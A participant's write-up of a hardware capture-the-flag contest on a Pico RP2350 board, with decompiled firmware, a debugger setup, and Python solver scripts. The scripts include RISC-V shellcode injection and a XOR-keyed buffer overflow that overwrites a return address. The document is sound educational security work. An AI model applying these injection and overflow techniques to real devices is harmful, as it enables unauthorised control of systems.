#  **Third** Winner: **@p4bl0vx** (Pablo Moya Lopez)

# HCON 2026 Hardware CTF Writeup 

# [0x01] Short Pin
First challenge, the title is very self-explanatory but I took a look at the code just to be sure. The first 3 lines enable the GPIO 2 pull-up resistor keeping it at a HIGH state, if I short it`gpio_get()` will read LOW and I will pass the check.

```c
void shortPin(void)

{
  bool pinValue;
  bool pinState;
  undefined1 auStack_118 [256];
  int i;
  bool win;
  
  gpio_init(2); // Initialize GPIO 2
  gpio_set_dir(2,0); // Set it as input
  gpio_pull_up(2); // Enable pull-up resistor providing a 3.3V currrent
  puts(s_Rules:_-_The_objective_of_this_C_ram_2002aa48);
  do {
    win = true;
    puts(s_CHALLENGE:_Checking_if_GPIO2_is_s_ram_2002ad88);
    pinValue = gpio_get();
    if (!pinValue) {
      puts(s_woha..._ram_2002adb4);
    }
    for (i = 0; i < 200; i = i + 1) {
      pinState = gpio_get();
      if (pinState) {
        win = false;
        break;
      }
      sleep(10);
    }
    if (win != false) {
      do {
        FUN_ram_200001e6(6,auStack_118,0x100);
        printf(s_SOLVED!_GPIO2_is_connected_to_GN_ram_2002adc0,auStack_118);
        sleep(1000);
      } while( true );
    }
    sleep(500);
  } while( true );
}
```
So, that's straight forward. The challenge suggests using keys, but I'm a professional so I will use a jumper wire. One end in the GPIO2 and the other one to ground and first flag obtained.

# [0x02] The switch pattern game

This time we get to play a game. The objective is to correctly pass 10 rounds. The game is easy first the green LED starts blinking 10 times and when it stops we have some time to push the button. 
```c
void reflexGame(void)

{
  int iVar1;
  undefined1 auStack_130 [256];
  int m;
  char local_29;
  int l;
  int k;
  int j;
  bool local_19;
  int i;
  int local_14;
  
  gp = &DAT_ram_20031455;
  if (DAT_ram_20030c5c != '\x01') {
    return;
  }
  puts(s_Rules:_-_The_objective_of_this_C_ram_2002c4e8);
LAB_ram_200016c2:
  do {
    gpio_init(0x19);
    gpio_set_dir(0x19,1);
    local_14 = 0;
    puts(s_===_THE_DREGAME:_10_ROUNDS_===_ram_2002c77c);
    for (i = 1; i < 0xb; i = i + 1) {
      printf(s_Round_%d/10:_Get_ready..._ram_2002c7a0,i);
      local_19 = false;
      for (j = 0; j < 10; j = j + 1) {
        gpio_put(0x19,1);
        for (k = 0; k < 10; k = k + 1) {
          iVar1 = checkButton();
          if (iVar1 != 0) {
            local_19 = true;
            break;
          }
          sleep(10);
        }
        gpio_put(0x19,0);
        for (l = 0; l < 10; l = l + 1) {
          iVar1 = checkButton();
          if (iVar1 != 0) {
            local_19 = true;
            break;
          }
          sleep(10);
        }
        if (local_19 != false) break;
      }
      if (local_19 != false) {
        gpio_put(0x19,0);
        puts(s_GAME_OVER_-_You_lose!_ram_2002c7bc);
        printf(s_Final_score:_%d/10_ram_2002c7d4,i + -1);
        goto LAB_ram_200016c2;
      }
      gpio_put(0x19,1);
      local_29 = '\0';
      for (m = 0; m < 100; m = m + 1) {
        iVar1 = checkButton();
        if (iVar1 != 0) {
          local_29 = '\x01';
          break;
        }
        sleep(100);
      }
      gpio_put(0x19,0);
      if (local_29 == '\0') {
        puts(s_You_missed!_ram_2002c7fc);
      }
      else {
        puts(s_Well_done!_ram_2002c7ec);
        local_14 = local_14 + 1;
      }
      sleep(1000);
    }
    puts(s_===_FINAL_RESULT_===_ram_2002c80c);
    printf(s_Score:_%d/10_ram_2002c824,local_14);
    if (local_14 == 10) {
      puts(s_PERFECT!_You_got_them_all_right!_ram_2002c834);
      do {
        FUN_ram_200001e6(0x46,auStack_130,0x100);
        printf(s_Flag:_%s_ram_2002c858,auStack_130);
        sleep(2000);
      } while( true );
    }
    if (local_14 < 7) {
      if (local_14 < 5) {
        puts(s_You_need_more_practice..._ram_2002c8a0);
      }
      else {
        puts(s_Not_bad,_but_you_can_improve!_ram_2002c880);
      }
    }
    else {
      puts(s_Very_good!_Almost_perfect!_ram_2002c864);
    }
    puts(s_Game_over_ram_2002c8bc);
  } while( true );
}
```

I came to the conclusion about the button after checking this function. The function effectively hijacks the Chip Select (SS) pin of the flash memory and then checks the QSPI SS pin state. In PICO boards this pin is connected to BOOTSEL button, so now we have the solution to the game. Also notice that to avoid crashes the code disable interrupts with `mstatus = mstatus & 0xfffffff7;`.
```c
bool checkButton(void)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  bool bVar4;
  int local_50;

  uVar3 = mstatus;
  gp = &DAT_ram_20031455;
  if (DAT_ram_20030c5c == '\x01') {
    mstatus = mstatus & 0xfffffff7;
    uVar1 = Peripherals::IO_QSPI.GPIO_QSPI_SS_CTRL;
    Peripherals::IO_QSPI_xor.GPIO_QSPI_SS_CTRL = (uVar1 ^ 0x8000) & 0xc000;
    for (local_50 = 0; local_50 < 1000; local_50 = local_50 + 1) {
    }
    uVar1 = Peripherals::SIO.GPIO_HI_IN;
    uVar2 = Peripherals::IO_QSPI.GPIO_QSPI_SS_CTRL;
    Peripherals::IO_QSPI_xor.GPIO_QSPI_SS_CTRL = uVar2 & 0xc000;
    if ((uVar3 & 8) != 0) {
      mstatus = mstatus | 8;
    }
    bVar4 = (uVar1 & 0x8000000) == 0;
  }
  else {
    bVar4 = false;
  }
  return bVar4;
}
```

After a few attempts I got the flag (I was not patient enough and I pushed the button a few times with the LED blinking).

# [0x03] crazy baud rates
Moving on, we find a function that prints the flag in four fragments. Looking at the rest of the code, I notice an array that contains four baud rates.

```c
void crazy_baudrates(void)

{
  undefined1 flagPart [128];
  undefined1 auStack_140 [256];
  int baudrates [4];
  int local_30;
  uint local_2c;
  uint local_28;
  uint local_24;
  uint local_20;
  uint i;
  int baudrate;
  byte local_11;
  
  puts(s_Rules:_-_The_objective_of_this_C_ram_2002adf0);
  puts(s_CHALLENGE:_Crazy_baud_rates!_ram_2002b130);
  local_28 = FUN_ram_20000196(50);
  local_2c = local_28 >> 2;
  baudrates[0] = DAT_ram_2002b16c;
  baudrates[1] = DAT_ram_2002b170;
  baudrates[2] = DAT_ram_2002b174;
  baudrates[3] = DAT_ram_2002b178;
  local_11 = 0;
  baudrate = currentBaudrate;
  do {
    if (baudrate != currentBaudrate) {
      baudrate = currentBaudrate;
      for (i = 0; (int)i < 4; i = i + 1) {
        if ((baudrates[i] == currentBaudrate) && ((local_11 >> (i & 0x1f) & 1) == 0)) {
          local_30 = local_2c * i;
          if (i == 3) {
            local_20 = local_28;
          }
          else {
            local_20 = local_2c + local_30;
          }
          local_24 = local_20 - local_30;
          if (0x7f < local_24) {
            local_24 = 0x7f;
          }
          FUN_ram_200001e6(0x32,auStack_140,0x100);
          memcpy(flagPart,auStack_140 + local_30,local_24);
          flagPart[local_24] = 0;
          printf(s_Part_%d_(@%u_baud):_%s_ram_2002b150,i + 1,currentBaudrate,flagPart);
          local_11 = (byte)(1 << (i & 0x1f)) | local_11;
          break;
        }
      }
    }
    sleep(200);
  } while( true );
}
```

So the the program is sending the flag throught serial, I should see it in terminal... but there is a problem here. My `minicom` is receiving data but doesn't "understand" it, because the program is changing the speed in which the data is send.

This can be solved easily but not using `minicom`, the easiest solution I found is using `pyserial` a simple script and we are good to go, we join the 4 pieces and the flag is complete.

```python
import serial
from time import sleep

baud_rates = [0x4b00, 0x2580, 0x9600, 0x1c200]

ser = serial.Serial('/dev/ttyACM0', 115200)


ser.read_all()
ser.readlines(2)

ser.write(b'c\n')
sleep(1)

while ser.in_waiting > 0:
    print(ser.readline().decode().strip())

for i in range(4):
    ser.baudrate = baud_rates[i]
    print(ser.readline().decode().strip())

ser.close()
```

# [0x04] bypass the BP challenge
Here is when things started to get messy, I've never heard about debugging the pico with another pico, also this I didn't have the physical debugger for the task.

Fortunately, this can be done with other Raspberry PI. I have one that is part of my homelab, so I flashed a new OS to a spare micro SD card and started installing the debugging software.

I'm going to document the setup I used to connect the two boards for people in my situation, the rest can skip to the GDB part.
> I used a Raspberry PI 3b

First install `openocd`, then connect `GPIO 25` to `SCK` and `GPIO 24` to `SWD`, finally connect the ground on both boards. I recommend to use shorter cables to avoid problems later. To establish the connection I used the following command:

```bash
sudo openocd -f interface/raspberrypi-swd.cfg -c "adapter gpio swclk 25" -c "adapter gpio swdio 24" -c "adapter speed 5000" -f target/rp2350-riscv.cfg -c "init"
```
Then connect GDB, in another terminal:
```bash
gdb-multiarch
(gdb) target remote localhost:3333
```

## The actual solution
After achieving the debugging session, I'm ready to use GDB. The roadblock in this code is the `ebreak()` a RISCV instruction used to trigger a breakpoint.

```c
void debug(void)

{
  puts(s_Rules:_-_The_objective_of_this_C_ram_2002cd10);
  puts(s_CHALLENGE:_win_the_break!_ram_2002d10c);
  FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 8));
  FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 4));
  sleep(1000);
  ebreak();
  do {
    print_flag();
    sleep(2000);
  } while( true );
}
```

The solution to this is quite simple, the `ebreak` instruction is just two bytes long so I added 2 to the `pc` and the function execution will continue smoothly.
```bash
(gdb) continue
Continuing.

Thread 2 "rp2350.rv1" received signal SIGTRAP, Trace/breakpoint trap.
[Switching to Thread 2]
0x20001b22 in ?? ()
(gdb) info registers
ra             0x20001b22	0x20001b22
sp             0x20080fb0	0x20080fb0
gp             0x20031455	0x20031455
tp             0x0	0x0
t0             0x6120676e	1629513582
t1             0x0	0
t2             0x0	0
fp             0x20080fc0	0x20080fc0
s1             0x0	0
a0             0x1738821	24348705
a1             0x0	0
a2             0x0	0
a3             0x10000	65536
a4             0x1738821	24348705
a5             0x1738821	24348705
a6             0x16445e5	23348709
a7             0x0	0
s2             0x0	0
s3             0x0	0
s4             0x0	0
s5             0x0	0
s6             0x0	0
s7             0x0	0
s8             0x0	0
s9             0x0	0
s10            0x0	0
s11            0x0	0
t3             0xa0d2e6e	168636014
t4             0x75662067	1969627239
t5             0x6e697661	1852405345
t6             0x6820646e	1746953326
pc             0x20001b22	0x20001b22
(gdb) jump *0x20001b24 
```

# [0x05] riscky payvload
This challenge introduced me into RISCV instructions set. The challenge recieves a single instruction and checks the format with `instructionChecker()`, then execute the instruction.

```c
void riscky(void)

{
  bool bVar1;
  void *stack_base;
  int local_1c;
  byte local_18 [4];
  
  local_1c = DAT_ram_2002a3c8;
  local_18 = DAT_ram_2002a3cc;
  puts(s_Rules:_-_The_objective_of_this_C_ram_20029f48);
  puts(s_Starting_riscky_payvload_challen_ram_2002a304);
  puts(s_Enter_4_bytes_hex_values_to_appe_ram_2002a32c);
  FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 4));
  FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 8));
  FUN_ram_20012bbc(s_%2hhx_%2hhx_%2hhx_%2hhx_ram_2002a370,local_18,local_18 + 1,local_18 + 2,
                   local_18 + 3);
  bVar1 = instructionChecker((uint)local_18);
  if (!bVar1) {
    do {
      puts(s_Payload_check_failed!_ram_2002a388);
      sleep(1000);
    } while( true );
  }
  puts(s_Payload_check_passed!_ram_2002a3a0);
  core1_wrapper((_func_int *)&local_1c,stack_base);
  do {
    puts(s_Hello,_world!_ram_2002a3b8);
    sleep(1000);
  } while( true );
}
```

By reading the below function I obtain the correct instruction an `addi`. The instruction has this format `addi rd, rs1, imm`. The rs1 is 0, in RISCV this register is always zero, so the operation is this `rd = imm + 0`.
```c
bool instructionChecker(uint instruction)

{
  uint3 uVar1;
  bool correct;
  
  gp = &DAT_ram_20031455;
  if (instruction == 0) {
    correct = false;
  }
  else {
    uVar1 = *(uint3 *)instruction;
    if ((uVar1 & 0b01111111) == 0b00010011) {   // OPCODE check
      if ((uVar1 >> 12 & 0b00000111) == 0) {    // funct3 check
        if ((uVar1 >> 15 & 0b00011111) == 0) {  // rs1 check
          correct = true;
        }
        else {
          correct = false;
        }
      }
      else {
        correct = false;
      }
    }
    else {
      correct = false;
    }
  }
  return correct;
}
```

Now we need to know the rd and the imm, the previous functions don't contain the logic for printing the flag so i looked for the string that is printed when the challenge is solved. I found the function below which receives a char as argument.
```c
void solveRiscky(char param_1)

{
  undefined1 auStack_110 [264];

  if (param_1 == 'i') {
    do {
      FUN_ram_100002fa(0x49,auStack_110,0x100);
      FUN_ram_10008d88(s_Solved!_risckypayvload->_flag:_ram_20029f04,auStack_110);
      FUN_ram_10004df6(1000);
    } while( true );
  }
  do {
    FUN_ram_10008d88(s_Wrong_magic_byte:_0x%02X_ram_20029f2c,param_1);
    FUN_ram_10004df6(1000);
  } while( true );
}
```
The idea is to set the correct argument, the arguments in RISCV are stored in `aX` registers. The instruction should set the `a0` register as `i` which is `105` in decimal, `addi a0, x0, 105` (`13 05 90 06`).

# [0x06] put led on
Now I faced the challenge that was a literal nightmare to solve. The program ask for a self contained payload that will turn on the led wired to the GPIO 25, the green one. The sequence to do this is initialize the pin, set it as output and set the output to high. That's an easy task unless you forget to set the pin as output and spend an eternity hunting the bug.

In this case we don't have to pay a lot of attention to the code as the description of the challenge is enough.
```c
void ledOn(void)

{
  int inputLen;
  char buffer [512];
  int local_20;
  uint local_1c;
  char *bufferChar;
  int count;
  
  puts(s_Rules:_-_The_objective_of_this_C_ram_2002c8cc);
  printf(s_CHALLENGE:_Turn_ON_the_LED_conne_ram_2002cc28,0x19);
  memset(FUN_ram_20030bc0,0,100);
  do {
    while( true ) {
      printf(s_Enter_payload_bytes_in_hex_(ex:_6_ram_2002cc70,99);
      FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 4));
      FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 8));
      inputLen = read(buffer,0x200,*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 4));
      if (inputLen != 0) break;
      puts(s_Input_error_ram_2002ccb4);
    }
    count = 0;
    bufferChar = buffer;
    while ((*bufferChar != '\0' && (count < 99))) {
      for (; (*bufferChar != '\0' &&
             ((((*bufferChar == ' ' || (*bufferChar == '\t')) || (*bufferChar == '\r')) ||
              (*bufferChar == '\n')))); bufferChar = bufferChar + 1) {
      }
      if ((*bufferChar == '\0') ||
         (inputLen = FUN_ram_20012bec(bufferChar,s_%x%n_ram_20029e5c,&local_1c,&local_20),
         inputLen != 1)) break;
      *(uint *)(FUN_ram_20030bc0 + count) = local_1c & 0xff;
      bufferChar = bufferChar + local_20;
      count = count + 1;
    }
    printf(s_Read_%d_bytes_ram_2002ccc4,count);
    if (0 < count) {
      gpio_init(0x19);
      puts(s_Executing_payload..._ram_2002ccd4);
      FUN_ram_20001116();
      DAT_ram_20030c5d = 1;
      FUN_ram_20030bc0();
    }
  } while( true );
}
```

The following is my asm code to turn the LED on.
> Important to notice that the pin is already initialized in the firmware

```asm
lui a5, 0xd0000  Loads base address 0xd0000000 (SIO region)
lui a0, 0x2000   Loads bit mask (GPIO 25)
sw a0, 56(a5)    Writes to 0xd0000038 (GPIO_OE_SET register)
sw a0, 24(a5)    Writes to 0xd0000018 (GPIO_OUT_SET register)
j .              Create infinite loop

```

And finally here is the solver code I used.
```python
import serial

ser = serial.Serial('/dev/ttyACM0', 115200)

ser.read_all()
ser.readlines(2)

ser.write(b'l\n')

while ser.in_waiting > 0:
    print(ser.readline().decode().strip())

payload = "b7 07 00 d0 37 05 00 02 23 ac a7 02 23 ac a7 00 6f 00 00 00\n"

ser.write(payload.encode())

while ser.in_waiting > 0:
    print(ser.readline().decode().strip())
```

# [0x07] dear x: or b0f
We’ve reached the end and we face the challenge of exploiting a buffer overflow. The code is a bit more complex than a usual buffer overflow, but nothing really fancy, It XORs the input bytes with a 4-byte key and then compares the results, checking if at least 26 of them are identical.
```c
void bof(void)

{
  int bytes;
  char buffer [256];
  int local_34;
  uint local_30;
  byte xorKey [4];
  uint j;
  int equalBytes;
  int i;
  char *bufferChar;
  int count;
  
  puts(s_Rules:_-_The_objective_of_this_C_ram_2002994c);
  printf(s_Starting_dear_x:_or_b0f_challeng_ram_20029dd0,win);
  do {
    while( true ) {
      puts(s_Enter_32_hex_bytes_(e.g._69_69_._ram_20029e10);
      FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 4));
      FUN_ram_20012740(*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 8));
      bytes = read(buffer,0x100,*(undefined4 *)(PTR_DAT_ram_2002fab0_ram_2002fd60 + 4));
      if (bytes != 0) break;
      puts(s_Input_error,_try_again._ram_20029e40);
    }
    count = 0;
    bufferChar = buffer;
    while ((*bufferChar != '\0' && (count < 0x20))) {
      for (; (*bufferChar != '\0' &&
             ((((*bufferChar == ' ' || (*bufferChar == '\t')) || (*bufferChar == '\r')) ||
              (*bufferChar == '\n')))); bufferChar = bufferChar + 1) {
      }
      if ((*bufferChar == '\0') ||
         (bytes = FUN_ram_20012bec(bufferChar,s_%x%n_ram_20029e5c,&local_30,&local_34), bytes != 1))
      break;
      *(uint *)(BYTE_ARRAY_ram_20030750 + count) = local_30 & 0xff;
      bufferChar = bufferChar + local_34;
      count = count + 1;
    }
    if (count == 0x20) {
      printf(s_Received_%d_bytes._Proceeding..._ram_20029e64,0x20);
      xorKey[0] = BYTE_ARRAY_ram_2002fd50[0];
      xorKey[1] = BYTE_ARRAY_ram_2002fd50[1];
      xorKey[2] = BYTE_ARRAY_ram_2002fd50[2];
      xorKey[3] = BYTE_ARRAY_ram_2002fd50[3];
      for (i = 0; (uint)i < 0x1f; i = i + 1) {
        *(uint *)(BYTE_ARRAY_ram_20030750 + i) = (uint)(xorKey[i % 4] ^ BYTE_ARRAY_ram_20030750[i]);
      }
      equalBytes = 0;
      for (j = 0; j < 0x1f; j = j + 1) {
        if (BYTE_ARRAY_ram_20030750[0] == BYTE_ARRAY_ram_20030750[j]) {
          equalBytes = equalBytes + 1;
        }
      }
      if (26 < equalBytes) {
        FUN_ram_20001116();
        FUN_ram_20000326(win);
        do {
          puts(s_bye!_ram_20029efc);
          sleep(1000);
        } while( true );
      }
      do {
        printf(s_Invalid_input_data._Expected_mor_ram_20029eac,equalBytes);
        sleep(1000);
      } while( true );
    }
    printf(s_Parsed_%d_bytes,_need_%d._Retry._ram_20029e88,count,0x20);
  } while( true );
}
```
At first I started solving the input check, sending the xor key repeatedly will make all bytes to 0. After that I started to increase the bytes by four repeatedly until the execution crashed. At the moment of the crash the pc was sitting at 0x00000000, exactly our input when it's xored. Now, we can XOR the target function address with the key and add it to our payload.

```python
import serial

ser = serial.Serial('/dev/ttyACM0', 115200)

ser.read_all()
ser.readlines(2)

ser.write(b'd\n')

while ser.in_waiting > 0:
    print(ser.readline().decode().strip())

ret_addr = "89 c0 44 04"
payload = "2f c2 44 24 2f c2 44 24 2f c2 44 24 2f c2 44 24 " + ret_addr

ser.write(payload.encode())

flag = ""
while flag == "":
    if ser.in_waiting:
        flag = ser.readline().decode().strip()

print(flag.strip())
ser.close()
```

With this script my journey through this CTF ended. I really had a great time solving all this challenges and what is more important, I learned a lot about the Pico hardware, debugging, RISCV assembly... Finally, I hope this writeup make more clear how to approach all the challenges for all of you reading it.

Happy Hacking ; )
